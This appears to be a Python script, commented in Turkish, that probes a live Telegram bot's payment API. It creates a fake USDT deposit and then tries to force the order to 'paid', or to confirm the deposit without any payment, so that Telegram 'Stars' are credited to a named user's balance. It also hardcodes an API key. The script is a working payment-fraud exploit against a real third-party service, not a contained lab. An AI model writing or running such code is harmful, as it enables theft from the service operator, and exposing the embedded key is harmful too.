import requests
import time

API_KEY = "izVCW5zRIcG6nmNcYqC2-geg3OAZYzJr60B1b3ljN3c"
BASE_URL = "https://api.wizard-bot.com/v1"

headers = {
    "X-API-KEY": API_KEY,
    "Content-Type": "application/json"
}

print("🚀 Test basliyor...")
print("⏳ API'nin rate limitini asmak icin 5 saniye bekleniyor...")
time.sleep(5)

# 1. Sahte depozit olustur (USDT)
deposit_data = {
    "method": "USDT",
    "amount": 150,
    "currency": "USDT"
}

print(f"📤 Gönderilen veri: {deposit_data}")
response = requests.post(f"{BASE_URL}/deposits/create", json=deposit_data, headers=headers)
print(f"📥 API Cevap Kodu: {response.status_code}")
print(f"📄 API Cevap Metni: {response.text}")

# 200 veya 201 kodu başarılıdır!
if response.status_code in [200, 201]:
    result = response.json()
    deposit_id = result.get("data", {}).get("deposit", {}).get("id")
    
    if deposit_id:
        print(f"✅ Depozit olusturuldu. ID: {deposit_id}")
        print("⏳ Simdi sahte onay gonderiliyor (Acilik testi)...")

        # 2. Yöntem 1: /orders/create endpoint'ini dene (Logdaki hata eksik parametrelerdi)
        order_data = {
            "deposit_id": deposit_id,
            "recipient": "azerjnt", 
            "quantity": 150,        
            "category": "Stars",    
            "status": "paid"        
        }
        order_resp = requests.post(f"{BASE_URL}/orders/create", json=order_data, headers=headers)
        
        if order_resp.status_code in [200, 201]:
            print("🔥 ACIK BULUNDU! Siparis 'Odendi' olarak isaretlendi.")
            print("✅ Telegram'daki profilini kontrol et. Bakiye artmis olmali!")
        else:
            print(f"⚠️ 1. Yöntem basarisiz (Hata: {order_resp.status_code} - {order_resp.text})")
            print("⏳ Alternatif yöntem deneniyor...")
            
            # 3. Yöntem 2: /deposits/confirm endpoint'ini dene (Logda 'Not Found' verdi ama belki farklıdır)
            confirm_data = {"deposit_id": deposit_id}
            confirm_resp = requests.post(f"{BASE_URL}/deposits/confirm", json=confirm_data, headers=headers)
            
            if confirm_resp.status_code in [200, 201]:
                print("🔥 ACIK BULUNDU! /deposits/confirm ile onaylandi!")
                print("✅ Telegram'daki profilini kontrol et. Bakiye artmis olmali!")
            else:
                print(f"❌ 2. Yöntem de basarisiz (Hata: {confirm_resp.status_code} - {confirm_resp.text})")
                
                # 4. Son Çare: Hiçbir API onayı yemiyorsa, sistem "Admin Onayı" veya "Webhook" bekliyor demektir.
                print("\n⚠️ BU DURUMDA: Botun API'si onaylamayi kabul etmedi ama depozit olustu.")
                print("Bu, iki ihtimal oldugunu gosterir:")
                print("   A) Botun admin panelinde manuel onay bekliyor (Guvenli sistem).")
                print("   B) Bot, blockchain'den (USDT transferini) gercek zamanli kontrol ediyor (Cok guvenli sistem).")
                print("Eğer böyleyse, bu açık değil, bot saglamdir.")
    else:
        print("❌ JSON'dan 'id' çekilemedi. Veri yapısı farklı.")
else:
    print("❌ Depozit olusturulamadi.")
